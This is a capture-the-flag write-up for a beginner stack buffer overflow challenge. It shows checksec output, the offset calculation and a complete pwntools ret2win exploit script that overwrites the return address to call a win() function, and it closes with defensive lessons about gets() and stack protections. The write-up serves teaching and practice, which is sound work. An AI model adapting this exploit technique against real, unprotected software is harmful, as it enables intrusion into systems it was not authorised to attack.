# Buffer Overflow 101 - Writeup

## Challenge Info

- **Category**: PWN
- **Difficulty**: Easy
- **Points**: 150
- **Flag**: `FLAG{buff3r_0v3rfl0w_1s_34sy}`

## Analysis

### 1. Check Security Features

```bash
$ checksec chall
[*] '/path/to/chall'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
```

All protections are disabled - this is a classic buffer overflow scenario.

### 2. Disassemble the Binary

```bash
$ objdump -d chall | grep -A 20 "<main>"
```

Key observations:
- `main()` calls `vuln()` function
- `vuln()` uses `gets()` for input (vulnerable!)
- There's a `win()` function that prints the flag

### 3. Find the Win Function

```bash
$ objdump -d chall | grep win
0000000000401196 <win>:
```

`win()` is at address `0x401196`.

### 4. Calculate Offset

Using a cyclic pattern:

```python
from pwn import *
# Generate pattern
pattern = cyclic(100)
# After crash, find offset
offset = cyclic_find(0x6161616a)  # 'jaaa'
# offset = 72
```

The buffer is 64 bytes + 8 bytes saved RBP = 72 bytes to reach return address.

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
HOST = "localhost"
PORT = 9999
BINARY = "./chall"

# Addresses
WIN_ADDR = 0x401196

def exploit():
    # Connect
    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process(BINARY)

    # Build payload
    offset = 72
    payload = b"A" * offset
    payload += p64(WIN_ADDR)

    # Send payload
    p.sendlineafter(b"name?", payload)

    # Get flag
    p.interactive()

if __name__ == "__main__":
    exploit()
```

## Execution

```bash
# Local
$ python exploit.py

# Remote
$ python exploit.py REMOTE
```

## Flag

```
FLAG{buff3r_0v3rfl0w_1s_34sy}
```

## Lessons Learned

1. Never use `gets()` - it doesn't check buffer boundaries
2. Always enable stack protections in production code
3. ASLR and PIE make exploitation harder (but not impossible)
